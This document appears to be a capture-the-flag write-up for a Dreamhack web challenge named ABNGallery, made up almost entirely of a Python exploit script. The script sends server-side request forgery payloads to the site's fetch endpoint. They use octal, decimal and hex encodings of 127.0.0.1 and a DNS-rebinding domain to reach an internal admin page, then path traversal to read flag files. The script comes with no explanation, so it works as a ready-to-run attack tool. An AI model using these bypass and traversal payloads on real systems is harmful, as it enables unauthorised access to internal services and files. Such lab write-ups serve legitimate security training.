
![[WriteUps/web/ABNGallery/image2.png]]





```python
import requests
import time
import sys

HOST = "host8.dreamhack.games"
PORT = 9440
BASE_URL = f"http://{HOST}:{PORT}"
INTERNAL_PORT = 3000

print(f"[*] Target: {BASE_URL}")
print("[*] Starting Exploit Sequence...")

def try_exploit(name, payload_url):
    target = f"{BASE_URL}/fetch"
    params = {"url": payload_url}
    try:
        res = requests.get(target, params=params, timeout=3)
        if res.status_code == 200:
            content = res.text
            if "permission denied" not in content and "Missing" not in content:

                return True, content

            elif "permission denied" in content:

                return False, "Permission Denied (IP Check Failed)"

        return False, f"Status {res.status_code}"

    except requests.exceptions.ReadTimeout:

        return False, "Timeout"

    except Exception as e:

        return False, str(e)

filenames = ["flag", "flag.txt", "../flag", "../flag.txt"]

payloads = [
    # [Method 1] Octal IP (0177.0.0.1 -> 127.0.0.1) - 가장 유력
    f"http://0177.0.0.1:{INTERNAL_PORT}/admin?log=../{{file}}",
    # [Method 2] Decimal IP (2130706433 -> 127.0.0.1)
    f"http://2130706433:{INTERNAL_PORT}/admin?log=../{{file}}",
    # [Method 3] Hex IP (0x7f000001 -> 127.0.0.1)
    f"http://0x7f000001:{INTERNAL_PORT}/admin?log=../{{file}}",
    # [Method 4] DNS Rebinding (확률 게임)
    f"http://7f000001.08080808.rbndr.us:{INTERNAL_PORT}/admin?log=../{{file}}"

]

for filename in filenames:
    print(f"\n[?] Targeting file: {filename}")

    for payload_template in payloads:
        target_url = payload_template.format(file=filename)
        print(f"  -> Trying: {target_url[:60]}... ", end="")
        attempts = 10 if "rbndr.us" in target_url else 1

        for i in range(attempts):
            success, result = try_exploit("Attack", target_url)
            if success:
                print(f"\n\n[★] SUCCESSS! Flag Found!")
                print("=" * 50)
                print(result)
                print("=" * 50)
                sys.exit(0) # 플래그 찾으면 종료
            if "rbndr.us" in target_url and i < attempts - 1:
                print(".", end="", flush=True) 
                time.sleep(0.5)
        print(f" [Fail: {result}]")
        
print("\n[-] All attempts failed. Try increasing attempts or checking the server status.")
```






![[web/ABNGallery/image1.png]]